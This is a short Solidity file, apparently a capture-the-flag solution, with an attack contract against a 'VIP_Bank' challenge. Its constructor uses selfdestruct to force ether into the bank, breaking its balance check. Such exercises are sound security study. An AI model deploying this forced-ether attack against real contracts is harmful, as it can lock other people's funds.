// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "../src/VIPBank.sol";

contract AttackContract{
    VIP_Bank public vipBank;
    
    constructor(VIP_Bank _vipBank) payable {
        vipBank = _vipBank;
        selfdestruct(payable(address(vipBank)));
    }
}